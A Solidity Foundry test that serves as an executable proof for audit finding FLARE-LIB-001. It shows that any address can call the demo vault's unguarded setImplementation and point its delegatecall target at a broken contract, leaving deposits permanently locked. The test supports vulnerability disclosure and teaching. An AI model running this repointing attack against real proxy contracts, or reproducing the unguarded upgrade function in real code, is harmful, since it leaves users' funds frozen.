// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {UnprotectedProxyVault, WithdrawLogic, BrokenLogic} from "../src/demos/UnprotectedProxyVault.sol";

/// Executable proof for FLARE-LIB-001: deposit -> anyone (not just an
/// owner) repoints the delegatecall target -> every subsequent
/// withdrawal fails -> the remaining balance has no other exit.
contract UnprotectedProxyLockTest is Test {
    UnprotectedProxyVault internal vault;
    WithdrawLogic internal logic;
    BrokenLogic internal broken;

    address internal alice = address(0xA11CE);
    address internal attacker = address(0xBAD);

    function setUp() public {
        logic = new WithdrawLogic();
        vault = new UnprotectedProxyVault(address(logic));
        broken = new BrokenLogic();
        vm.deal(alice, 10 ether);
    }

    function test_withdrawWorksThroughTheHonestImplementation() public {
        vm.startPrank(alice);
        vault.deposit{value: 2 ether}();
        vault.withdraw(1 ether);
        vm.stopPrank();

        assertEq(vault.balances(alice), 1 ether);
        assertEq(alice.balance, 9 ether);
    }

    function test_anyoneCanRepointTheImplementationAndPermanentlyLockRemainingFunds() public {
        vm.prank(alice);
        vault.deposit{value: 2 ether}();
        assertEq(address(vault).balance, 2 ether);

        // The repointing call comes from `attacker`, not the vault's
        // deployer or any privileged role — setImplementation has no
        // access control, which is the entire vulnerability.
        vm.prank(attacker);
        vault.setImplementation(address(broken));

        vm.prank(alice);
        vm.expectRevert("delegatecall failed");
        vault.withdraw(1 ether);

        // Not a transient failure: the vault has no direct (non-
        // delegatecall) withdrawal path and no function to repoint
        // implementation back without knowing/trusting whoever calls it
        // next — the funds already deposited are stuck as long as
        // `implementation` points at an incompatible contract.
        assertEq(vault.balances(alice), 2 ether, "balance still recorded but unreachable");
        assertEq(address(vault).balance, 2 ether, "the deposit never leaves the contract");
    }
}
